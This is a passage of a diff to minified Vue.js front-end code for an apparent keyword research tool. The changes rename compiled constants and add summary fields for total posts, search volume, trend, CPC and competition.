-    },
-    UD = {
-        key: 1
-    },
-    MD = {
-        class: "search-results-summary-top-page-bid-label"
-    },
-    AD = {
-        class: "row"
-    },
-    PD = {
-        class: "col"
-    },
-    LD = {
-        key: 0,
-        class: "search-results-summary-low-top-page-bid-value h5 mb-0"
-    },
-    BD = {
-        key: 0
-    },
-    $D = {
-        key: 1,
-        class: "text-muted"
-    },
-    DD = ["data-bs-content"],
-    OD = {
-        key: 1,
-        class: "search-results-summary-low-top-page-bid-value text-blur h3"
-    },
-    jD = {
-        key: 0,
-        class: "row"
-    },
-    VD = {
-        class: "col"
-    },
     HD = {
-        key: 0,
-        class: "search-results-summary-high-top-page-bid-value h3"
+        class: "search-results-summary-unique-keywords-value h3"
     },
     ID = {
         key: 0
     },
     ND = {
-        key: 1,
-        class: "text-muted"
+        key: 1
     },
-    RD = ["data-bs-content"],
-    KD = {
-        key: 1,
-        class: "search-results-summary-high-top-page-bid-value text-blur h3"
-    },
-    JD = {
+    BD = {
+        key: 0,
         class: "col my-1"
     },
-    WD = {
+    RD = {
         key: 0
+    },
+    KD = {
+        class: "search-results-summary-total-post-label"
+    },
+    JD = {
+        key: 0,
+        class: "search-results-summary-total-posts-value h3"
     },
     zD = {
-        class: "search-results-summary-average-competition-label"
+        key: 0
     },
-    YD = ["data-bs-content"],
+    YD = {
+        key: 1
+    },
     GD = {
-        key: 0,
-        class: "search-results-summary-average-competition-value h3"
+        key: 1,
+        class: "search-results-summary-posts-value text-blur h3"
     },
     XD = {
-        key: 0
+        class: "col my-1"
     },
     QD = {
         key: 0
     },
     ZD = {
+        class: "search-results-summary-total-search-volume-label"
+    },
+    ej = ["data-bs-content"],
+    tj = {
+        key: 0,
+        class: "search-results-summary-total-search-volume-value h3"
+    },
+    rj = {
+        key: 0
+    },
+    sj = {
+        key: 1,
+        class: "text-muted"
+    },
+    aj = ["data-bs-content"],
+    oj = {
+        key: 1,
+        class: "search-results-summary-search-volume-value text-blur h3"
+    },
+    ij = {
+        class: "col my-1"
+    },
+    nj = {
+        key: 0
+    },
+    lj = {
+        class: "search-results-summary-average-trend-label"
+    },
+    cj = ["data-bs-content"],
+    _j = {
+        key: 0,
+        class: "search-results-summary-average-trend-value h3"
+    },
+    uj = {
+        key: 0
+    },
+    dj = {
+        key: 0,
+        class: "text-success"
+    },
+    mj = S("i", {
+        class: "bi bi-arrow-up"
+    }, null, -1),
+    hj = {
+        key: 1,
+        class: "text-danger"
+    },
+    pj = S("i", {
+        class: "bi bi-arrow-down"
+    }, null, -1),
+    gj = {
+        key: 2
+    },
+    yj = {
+        key: 0
+    },
+    wj = {
+        key: 1,
+        class: "text-muted"
+    },
+    fj = ["data-bs-content"],
+    bj = {
+        key: 1,
+        class: "search-results-summary-average-trend-value text-blur h3"
+    },
+    vj = {
+        key: 1,
+        class: "col my-1"
+    },
+    kj = {
+        key: 0
+    },
+    xj = {
+        class: "search-results-summary-average-cpc-label"
+    },
+    Cj = ["data-bs-content"],
+    Sj = {
+        key: 0,
+        class: "search-results-summary-average-cpc-value h3"
+    },
+    Tj = {
+        key: 0
+    },
+    Fj = {
+        key: 1,
+        class: "text-muted"
+    },
+    qj = ["data-bs-content"],
+    Ej = {
+        key: 1,
+        class: "search-results-summary-average-cpc-value text-blur h3"
+    },
+    Uj = {
+        key: 1
+    },
+    Mj = {
+        class: "search-results-summary-top-page-bid-label"
+    },
+    Aj = {
+        class: "row"
+    },
+    Pj = {
+        class: "col"
+    },
+    $j = {
+        key: 0,
+        class: "search-results-summary-low-top-page-bid-value h5 mb-0"
+    },
+    Lj = {
+        key: 0
+    },
+    Dj = {
+        key: 1,
+        class: "text-muted"
+    },
+    jj = ["data-bs-content"],
+    Oj = {
+        key: 1,
+        class: "search-results-summary-low-top-page-bid-value text-blur h3"
+    },
+    Wj = {
+        key: 0,
+        class: "row"
+    },
+    Vj = {
+        class: "col"
+    },
+    Hj = {
+        key: 0,
+        class: "search-results-summary-high-top-page-bid-value h3"
+    },
+    Ij = {
+        key: 0
+    },
+    Nj = {
+        key: 1,
+        class: "text-muted"
+    },
+    Bj = ["data-bs-content"],
+    Rj = {
+        key: 1,
+        class: "search-results-summary-high-top-page-bid-value text-blur h3"
+    },
+    Kj = {
+        class: "col my-1"
+    },
+    Jj = {
+        key: 0
+    },
+    zj = {
+        class: "search-results-summary-average-competition-label"
+    },
+    Yj = ["data-bs-content"],
+    Gj = {
+        key: 0,
+        class: "search-results-summary-average-competition-value h3"
+    },
+    Xj = {
+        key: 0
+    },
+    Qj = {
+        key: 0
+    },
+    Zj = {
         key: 1
     },
     eO = {
@@ -19712,35 +19734,35 @@ const A$ = Ue(GB, [
 const _O = {
         mixins: [mp],
         components: {
-            "instagram-search-volume-summary": Ue(P$, [
+            "instagram-search-volume-summary": Ue(PD, [
                 ["render", function(e, t, r, s, a, o) {
                     const i = k("bar-chart"),
                         n = k("pie-chart");
-                    return b(), g("div", null, [S("div", L$, [S("div", B$, [S("div", $$, [S("div", D$, [7 == r.current_tab ? (b(), g("div", O$, v(e.trans.get("Total Hashtags")), 1)) : 10 == r.current_tab ? (b(), g("div", j$, v(e.trans.get("Total People")), 1)) : (b(), g("div", V$, v(e.trans.get("Total Keywords")), 1)), S("div", H$, [r.summaries.search_total_keywords_format ? (b(), g("span", I$, v(r.summaries.search_total_keywords_format), 1)) : (b(), g("span", N$, v(e.$filters.digit(r.summaries.total_keywords)), 1))])]), 7 == r.current_tab ? (b(), g("div", R$, [r.current_permissions.show_posts_column ? (b(), g("div", K$, [S("div", J$, v(e.trans.get("Total Posts")), 1), r.current_permissions.show_posts_data ? (b(), g("div", W$, [r.summaries.total_posts_format ? (b(), g("span", z$, v(r.summaries.total_posts_format), 1)) : (b(), g("span", Y$, v(e.$filters.digit(r.summaries.total_posts)), 1))])) : (b(), g("div", G$, "88,888"))])) : T("", !0)])) : T("", !0), S("div", X$, [r.current_permissions.show_search_volume_column ? (b(), g("div", Q$, [S("div", Z$, [P(v(e.trans.get("Total Search Volume")) + " ", 1), S("i", {
+                    return b(), g("div", null, [S("div", $D, [S("div", LD, [S("div", DD, [S("div", jD, [7 == r.current_tab ? (b(), g("div", OD, v(e.trans.get("Total Hashtags")), 1)) : 10 == r.current_tab ? (b(), g("div", WD, v(e.trans.get("Total People")), 1)) : (b(), g("div", VD, v(e.trans.get("Total Keywords")), 1)), S("div", HD, [r.summaries.search_total_keywords_format ? (b(), g("span", ID, v(r.summaries.search_total_keywords_format), 1)) : (b(), g("span", ND, v(e.$filters.digit(r.summaries.total_keywords)), 1))])]), 7 == r.current_tab ? (b(), g("div", BD, [r.current_permissions.show_posts_column ? (b(), g("div", RD, [S("div", KD, v(e.trans.get("Total Posts")), 1), r.current_permissions.show_posts_data ? (b(), g("div", JD, [r.summaries.total_posts_format ? (b(), g("span", zD, v(r.summaries.total_posts_format), 1)) : (b(), g("span", YD, v(e.$filters.digit(r.summaries.total_posts)), 1))])) : (b(), g("div", GD, "88,888"))])) : T("", !0)])) : T("", !0), S("div", XD, [r.current_permissions.show_search_volume_column ? (b(), g("div", QD, [S("div", ZD, [P(v(e.trans.get("Total Search Volume")) + " ", 1), S("i", {
                         class: "bi bi-info-circle-fill ms-1",
                         "data-bs-content": e.trans.get("Total Search Volume is the sum of Search Volume values for keywords that were found."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, null, 8, eD)]), r.current_permissions.show_search_volume_data ? (b(), g("div", tD, [r.summaries.search_volume_format ? (b(), g("div", rD, v(r.summaries.search_volume_format), 1)) : (b(), g("div", sD, [S("span", {
+                    }, null, 8, ej)]), r.current_permissions.show_search_volume_data ? (b(), g("div", tj, [r.summaries.search_volume_format ? (b(), g("div", rj, v(r.summaries.search_volume_format), 1)) : (b(), g("div", sj, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, "-", 8, aD)]))])) : (b(), g("div", oD, "88,888"))])) : T("", !0)]), S("div", iD, [r.current_permissions.show_search_volume_column ? (b(), g("div", nD, [S("div", lD, [P(v(e.trans.get("Average Trend")) + " ", 1), S("i", {
+                    }, "-", 8, aj)]))])) : (b(), g("div", oj, "88,888"))])) : T("", !0)]), S("div", ij, [r.current_permissions.show_search_volume_column ? (b(), g("div", nj, [S("div", lj, [P(v(e.trans.get("Average Trend")) + " ", 1), S("i", {
                         class: "bi bi-info-circle-fill ms-1",
                         "data-bs-content": e.trans.get("Average Trend is the average of Trend values for keywords that were found."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, null, 8, cD)]), r.current_permissions.show_search_volume_data ? (b(), g("div", _D, [r.summaries.search_volume_trend_format ? (b(), g("div", uD, [r.summaries.search_volume_trend > 0 ? (b(), g("span", dD, [mD, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : r.summaries.search_volume_trend < 0 ? (b(), g("span", hD, [pD, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : (b(), g("span", gD, [0 == r.summaries.search_volume_trend ? (b(), g("span", yD)) : T("", !0), P(" " + v(r.summaries.search_volume_trend_format), 1)]))])) : (b(), g("div", wD, [S("span", {
+                    }, null, 8, cj)]), r.current_permissions.show_search_volume_data ? (b(), g("div", _j, [r.summaries.search_volume_trend_format ? (b(), g("div", uj, [r.summaries.search_volume_trend > 0 ? (b(), g("span", dj, [mj, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : r.summaries.search_volume_trend < 0 ? (b(), g("span", hj, [pj, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : (b(), g("span", gj, [0 == r.summaries.search_volume_trend ? (b(), g("span", yj)) : T("", !0), P(" " + v(r.summaries.search_volume_trend_format), 1)]))])) : (b(), g("div", wj, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, "-", 8, fD)]))])) : (b(), g("div", bD, "88%"))])) : T("", !0)]), 12 != r.current_tab ? (b(), g("div", vD, [r.current_permissions.show_cpc_column ? (b(), g("div", kD, [S("div", xD, [P(v(e.trans.get("Average CPC")) + " ", 1), r.current_permissions.show_currency_data && r.current_metrics_currency ? (b(), g(y, {
+                    }, "-", 8, fj)]))])) : (b(), g("div", bj, "88%"))])) : T("", !0)]), 12 != r.current_tab ? (b(), g("div", vj, [r.current_permissions.show_cpc_column ? (b(), g("div", kj, [S("div", xj, [P(v(e.trans.get("Average CPC")) + " ", 1), r.current_permissions.show_currency_data && r.current_metrics_currency ? (b(), g(y, {
                         key: 0
                     }, [P("(" + v(r.current_metrics_currency) + ") ", 1)], 64)) : T("", !0), S("i", {
                         class: "bi bi-info-circle-fill ms-1",
@@ -19748,35 +19770,35 @@ const _O = {
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, null, 8, CD)]), r.current_permissions.show_cpc_data ? (b(), g("div", SD, [r.summaries.average_cpc_format ? (b(), g("div", TD, v(r.summaries.average_cpc_format), 1)) : (b(), g("div", FD, [S("span", {
+                    }, null, 8, Cj)]), r.current_permissions.show_cpc_data ? (b(), g("div", Sj, [r.summaries.average_cpc_format ? (b(), g("div", Tj, v(r.summaries.average_cpc_format), 1)) : (b(), g("div", Fj, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, "-", 8, qD)]))])) : (b(), g("div", ED, "8.88"))])) : r.current_permissions.show_low_top_page_bid_column || r.current_permissions.show_high_top_page_bid_column ? (b(), g("div", UD, [S("div", MD, [P(v(e.trans.get("Top of Page Bid")) + " ", 1), r.current_permissions.show_currency_data && r.current_metrics_currency ? (b(), g(y, {
+                    }, "-", 8, qj)]))])) : (b(), g("div", Ej, "8.88"))])) : r.current_permissions.show_low_top_page_bid_column || r.current_permissions.show_high_top_page_bid_column ? (b(), g("div", Uj, [S("div", Mj, [P(v(e.trans.get("Top of Page Bid")) + " ", 1), r.current_permissions.show_currency_data && r.current_metrics_currency ? (b(), g(y, {
                         key: 0
-                    }, [P("(" + v(r.current_metrics_currency) + ") ", 1)], 64)) : T("", !0)]), S("div", AD, [S("div", PD, [r.current_permissions.show_low_top_page_bid_data ? (b(), g("div", LD, [r.summaries.low_top_page_bid ? (b(), g("div", BD, v(r.summaries.low_top_page_bid_format) + " (" + v(e.trans.get("Low")) + ")", 1)) : (b(), g("div", $D, [S("span", {
+                    }, [P("(" + v(r.current_metrics_currency) + ") ", 1)], 64)) : T("", !0)]), S("div", Aj, [S("div", Pj, [r.current_permissions.show_low_top_page_bid_data ? (b(), g("div", $j, [r.summaries.low_top_page_bid ? (b(), g("div", Lj, v(r.summaries.low_top_page_bid_format) + " (" + v(e.trans.get("Low")) + ")", 1)) : (b(), g("div", Dj, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, "-", 8, DD)]))])) : (b(), g("div", OD, "8.88"))])]), r.summaries.low_top_page_bid && r.summaries.high_top_page_bid ? (b(), g("div", jD, [S("div", VD, [r.current_permissions.show_high_top_page_bid_data ? (b(), g("div", HD, [r.summaries.high_top_page_bid ? (b(), g("div", ID, v(r.summaries.high_top_page_bid_format) + " (" + v(e.trans.get("High")) + ")", 1)) : (b(), g("div", ND, [S("span", {
+                    }, "-", 8, jj)]))])) : (b(), g("div", Oj, "8.88"))])]), r.summaries.low_top_page_bid && r.summaries.high_top_page_bid ? (b(), g("div", Wj, [S("div", Vj, [r.current_permissions.show_high_top_page_bid_data ? (b(), g("div", Hj, [r.summaries.high_top_page_bid ? (b(), g("div", Ij, v(r.summaries.high_top_page_bid_format) + " (" + v(e.trans.get("High")) + ")", 1)) : (b(), g("div", Nj, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, "-", 8, RD)]))])) : (b(), g("div", KD, "8.88"))])])) : T("", !0)])) : T("", !0)])) : T("", !0), S("div", JD, [r.current_permissions.show_competition_column ? (b(), g("div", WD, [S("div", zD, [P(v(e.trans.get("Average Competition")) + " ", 1), S("i", {
+                    }, "-", 8, Bj)]))])) : (b(), g("div", Rj, "8.88"))])])) : T("", !0)])) : T("", !0)])) : T("", !0), S("div", Kj, [r.current_permissions.show_competition_column ? (b(), g("div", Jj, [S("div", zj, [P(v(e.trans.get("Average Competition")) + " ", 1), S("i", {
                         class: "bi bi-info-circle-fill ms-1",
                         "data-bs-content": e.trans.get("Average Competition is the average of Competition values for keywords that were found."),
                         "data-bs-toggle": "popover-sv-summary",
                         "data-bs-placement": "bottom",
                         "data-bs-trigger": "hover focus"
-                    }, null, 8, YD)]), r.current_permissions.show_competition_data ? (b(), g("div", GD, [r.summaries.competition_format ? (b(), g("div", XD, ["" !== r.summaries.competition_class && null !== r.summaries.competition_class ? (b(), g("span", QD, [S("span", {
+                    }, null, 8, Yj)]), r.current_permissions.show_competition_data ? (b(), g("div", Gj, [r.summaries.competition_format ? (b(), g("div", Xj, ["" !== r.summaries.competition_class && null !== r.summaries.competition_class ? (b(), g("span", Qj, [S("span", {
                         class: f(r.summaries.competition_class)
-                    }, v(r.summaries.competition_format), 3)])) : (b(), g("span", ZD, v(r.summaries.competition_format), 1))])) : (b(), g("div", eO, [S("span", {
+                    }, v(r.summaries.competition_format), 3)])) : (b(), g("span", Zj, v(r.summaries.competition_format), 1))])) : (b(), g("div", eO, [S("span", {
                         class: "cursor-help",
                         "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                         "data-bs-toggle": "popover-sv-summary",
@@ -19809,7 +19831,7 @@ const _O = {
                     }, null, 8, ["chartlabels", "chartdata"])], 2)) : T("", !0)])) : T("", !0)])
                 }]
             ]),
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -19997,22 +20019,22 @@ const _O = {
     PO = {
         class: "form-label search-results-settings-modal-country-label"
     },
-    LO = ["value"],
-    BO = {
+    $O = ["value"],
+    LO = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    $O = {
+    DO = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    DO = {
+    jO = {
         class: "form-label search-results-settings-modal-currency-label"
     },
     OO = {
         key: 2,
         class: "row"
     },
-    jO = {
+    WO = {
         key: 0,
         class: "col-12 col-md-6"
     },
@@ -20029,17 +20051,17 @@ const _O = {
     NO = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    RO = {
+    BO = {
         key: 1,
         class: "row"
+    },
+    RO = {
+        class: "col-12 col-md-6"
     },
     KO = {
         class: "col-12 col-md-6"
     },
     JO = {
-        class: "col-12 col-md-6"
-    },
-    WO = {
         key: 2,
         class: "row"
     },
@@ -20062,127 +20084,127 @@ const _O = {
         key: 3,
         class: "row"
     },
-    ej = {
+    eW = {
         class: "col"
     },
-    tj = {
+    tW = {
         class: "search-results-settings-modal-is-private mb-3"
     },
-    rj = {
+    rW = {
         class: "form-label search-results-settings-modal-is-private-label"
     },
-    sj = {
+    sW = {
         class: "form-check"
     },
-    aj = ["checked"],
-    oj = S("label", {
+    aW = ["checked"],
+    oW = S("label", {
         class: "form-check-label",
         for: "is-private-any"
     }, " Any ", -1),
-    ij = {
+    iW = {
         class: "form-check"
     },
-    nj = ["checked"],
-    lj = S("label", {
+    nW = ["checked"],
+    lW = S("label", {
         class: "form-check-label",
         for: "is-private-yes"
     }, " Yes ", -1),
-    cj = {
+    cW = {
         class: "form-check disabled"
     },
-    _j = ["checked"],
-    uj = S("label", {
+    _W = ["checked"],
+    uW = S("label", {
         class: "form-check-label",
         for: "is-private-no"
     }, " No ", -1),
-    dj = {
+    dW = {
         class: "col"
     },
-    mj = {
+    mW = {
         class: "search-results-settings-modal-is-verified mb-3"
     },
-    hj = {
+    hW = {
         class: "form-label search-results-settings-modal-is-verified-label"
     },
-    pj = {
+    pW = {
         class: "form-check"
     },
-    gj = ["checked"],
-    yj = S("label", {
+    gW = ["checked"],
+    yW = S("label", {
         class: "form-check-label",
         for: "is-verified-any"
     }, " Any ", -1),
-    wj = {
+    wW = {
         class: "form-check"
     },
-    fj = ["checked"],
-    bj = S("label", {
+    fW = ["checked"],
+    bW = S("label", {
         class: "form-check-label",
         for: "is-verified-yes"
     }, " Yes ", -1),
-    vj = {
+    vW = {
         class: "form-check disabled"
     },
-    kj = ["checked"],
-    xj = S("label", {
+    kW = ["checked"],
+    xW = S("label", {
         class: "form-check-label",
         for: "is-verified-no"
     }, " No ", -1),
-    Cj = {
+    CW = {
         class: "row"
     },
-    Sj = {
+    SW = {
         class: "col-12"
     },
-    Tj = {
+    TW = {
         class: "row"
     },
-    Fj = {
+    FW = {
         class: "col-12"
     },
-    qj = {
+    qW = {
         key: 4,
         class: "row"
     },
-    Ej = {
+    EW = {
         class: "col-12"
     },
-    Uj = {
+    UW = {
         class: "search-results-settings-modal-filter-full-name mb-3"
     },
-    Mj = {
+    MW = {
         class: "form-label search-results-settings-modal-filter-full-name-label"
     },
-    Aj = {
+    AW = {
         class: "search-results-settings-modal-filter-full-name-help form-text text-muted"
     },
-    Pj = {
+    PW = {
         class: "search-results-summary card my-4 bg-light"
     },
-    Lj = {
+    $W = {
         key: 0,
         class: "card-body"
     },
-    Bj = ["innerHTML"],
-    $j = ["innerHTML"],
-    Dj = ["innerHTML"],
-    Oj = ["innerHTML"],
-    jj = ["innerHTML"],
-    Vj = {
+    LW = ["innerHTML"],
+    DW = ["innerHTML"],
+    jW = ["innerHTML"],
+    OW = ["innerHTML"],
+    WW = ["innerHTML"],
+    VW = {
         class: "search-results-keywords my-3"
     },
-    Hj = {
+    HW = {
         key: 0,
         class: "mb-4"
     },
-    Ij = {
+    IW = {
         key: 1,
         class: "mb-4"
     },
-    Nj = S("i", {
+    NW = S("i", {
         class: "bi bi-clipboard me-1"
     }, null, -1);
-const Rj = Ue(_O, [
+const BW = Ue(_O, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("loading-section"),
                 n = k("current-filter-keyword-result-period"),
@@ -20198,17 +20220,17 @@ const Rj = Ue(_O, [
                 q = k("search-results-settings-modal-search-network"),
                 M = k("search-results-settings-modal-currency"),
                 A = k("search-results-settings-modal-search-volume"),
-                $ = k("search-results-settings-modal-search-volume-trend"),
-                D = k("search-results-settings-modal-average-cpc"),
+                D = k("search-results-settings-modal-search-volume-trend"),
+                j = k("search-results-settings-modal-average-cpc"),
                 O = k("search-results-settings-modal-bing-competition"),
                 V = k("search-results-settings-modal-competition"),
                 H = k("search-results-settings-filter-positive-keywords"),
                 I = k("search-results-settings-filter-negative-keywords"),
                 N = k("tag-input"),
-                R = k("search-results-settings-admin-settings"),
-                K = k("search-results-settings-modal"),
-                J = k("search-results-tabs"),
-                W = k("has-error"),
+                B = k("search-results-settings-admin-settings"),
+                R = k("search-results-settings-modal"),
+                K = k("search-results-tabs"),
+                J = k("has-error"),
                 z = k("suggest-page-reload"),
                 Y = k("instagram-search-volume-summary"),
                 G = k("show-upsell"),
@@ -20224,7 +20246,7 @@ const Rj = Ue(_O, [
                 ie = k("dropdown-menu-item-copy-keywords-search-volume"),
                 ne = k("dropdown-menu-item-copy-keywords-all-data"),
                 le = k("search-results-actions"),
-                ce = L("mask");
+                ce = $("mask");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
             }, null, 8, ["loading"]), S("div", uO, [S("div", dO, [E(n, {
@@ -20294,7 +20316,7 @@ const Rj = Ue(_O, [
                 class: "search-results-settings-display-is-verified-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[3] || (t[3] = t => e.clearFilter("is_verified", "all"))
-            }, "×")])) : T("", !0)], 64)) : T("", !0)]), E(K, {
+            }, "×")])) : T("", !0)], 64)) : T("", !0)]), E(R, {
                 onResetFilter: e.resetFilter,
                 onApplyFilter: e.applyFilter,
                 filter_counter: e.filter_counter,
@@ -20308,14 +20330,14 @@ const Rj = Ue(_O, [
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, LO)])]), e.current_permissions.show_currency_settings ? (b(), g("div", BO, [S("div", $O, [S("label", DO, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, $O)])]), e.current_permissions.show_currency_settings ? (b(), g("div", LO, [S("div", DO, [S("label", jO, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", OO, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", jO, [E(q, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", OO, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", WO, [E(q, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[4] || (t[4] = t => e.current_metrics_network = t),
@@ -20325,7 +20347,7 @@ const Rj = Ue(_O, [
                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[5] || (t[5] = t => e.current_metrics_currency = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", HO, [S("div", IO, [S("h5", NO, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", RO, [S("div", KO, [E(A, {
+                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", HO, [S("div", IO, [S("h5", NO, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", BO, [S("div", RO, [E(A, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -20333,7 +20355,7 @@ const Rj = Ue(_O, [
                     "onUpdate:current_filter_search_volume_min": t[6] || (t[6] = t => e.current_filter_search_volume_min = t),
                     current_filter_search_volume_max: e.current_filter_search_volume_max,
                     "onUpdate:current_filter_search_volume_max": t[7] || (t[7] = t => e.current_filter_search_volume_max = t)
-                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"]), E($, {
+                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"]), E(D, {
                     current_permissions: e.current_permissions,
                     search_volume_trend_format: e.search_volume_trend_format,
                     error_fields: e.error_fields,
@@ -20341,7 +20363,7 @@ const Rj = Ue(_O, [
                     "onUpdate:current_filter_search_volume_trend_min": t[8] || (t[8] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[9] || (t[9] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", JO, [E(D, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", KO, [E(j, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -20363,7 +20385,7 @@ const Rj = Ue(_O, [
                     "onUpdate:current_filter_competition_min": t[13] || (t[13] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[14] || (t[14] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), e.current_permissions.show_posts_data ? (b(), g("div", WO, [S("div", zO, [S("div", YO, [S("label", GO, v(e.trans.get("Posts")), 1), S("div", XO, [F(S("input", {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), e.current_permissions.show_posts_data ? (b(), g("div", JO, [S("div", zO, [S("div", YO, [S("label", GO, v(e.trans.get("Posts")), 1), S("div", XO, [F(S("input", {
                     placeholder: "min",
                     type: "text",
                     class: f(["form-control", {
@@ -20385,7 +20407,7 @@ const Rj = Ue(_O, [
                 }, null, 2), [
                     [ce, e.integer_format],
                     [U, e.current_filter_posts_max]
-                ])])])])])) : T("", !0), e.current_permissions.show_is_private_data ? (b(), g("div", ZO, [S("div", ej, [S("div", tj, [S("label", rj, v(e.trans.get("Is Private")), 1), S("div", sj, [F(S("input", {
+                ])])])])])) : T("", !0), e.current_permissions.show_is_private_data ? (b(), g("div", ZO, [S("div", eW, [S("div", tW, [S("label", rW, v(e.trans.get("Is Private")), 1), S("div", sW, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_private",
@@ -20393,9 +20415,9 @@ const Rj = Ue(_O, [
                     value: "",
                     "onUpdate:modelValue": t[17] || (t[17] = t => e.current_filter_is_private = t),
                     checked: "" == e.current_filter_is_private
-                }, null, 8, aj), [
-                    [j, e.current_filter_is_private]
-                ]), oj]), S("div", ij, [F(S("input", {
+                }, null, 8, aW), [
+                    [W, e.current_filter_is_private]
+                ]), oW]), S("div", iW, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_private",
@@ -20403,9 +20425,9 @@ const Rj = Ue(_O, [
                     value: "1",
                     "onUpdate:modelValue": t[18] || (t[18] = t => e.current_filter_is_private = t),
                     checked: "1" == e.current_filter_is_private
-                }, null, 8, nj), [
-                    [j, e.current_filter_is_private]
-                ]), lj]), S("div", cj, [F(S("input", {
+                }, null, 8, nW), [
+                    [W, e.current_filter_is_private]
+                ]), lW]), S("div", cW, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_private",
@@ -20413,9 +20435,9 @@ const Rj = Ue(_O, [
                     value: "0",
                     "onUpdate:modelValue": t[19] || (t[19] = t => e.current_filter_is_private = t),
                     checked: "0" == e.current_filter_is_private
-                }, null, 8, _j), [
-                    [j, e.current_filter_is_private]
-                ]), uj])])]), S("div", dj, [S("div", mj, [S("label", hj, v(e.trans.get("Is Verified")), 1), S("div", pj, [F(S("input", {
+                }, null, 8, _W), [
+                    [W, e.current_filter_is_private]
+                ]), uW])])]), S("div", dW, [S("div", mW, [S("label", hW, v(e.trans.get("Is Verified")), 1), S("div", pW, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_verified",
@@ -20423,9 +20445,9 @@ const Rj = Ue(_O, [
                     value: "",
                     "onUpdate:modelValue": t[20] || (t[20] = t => e.current_filter_is_verified = t),
                     checked: "" == e.current_filter_is_verified
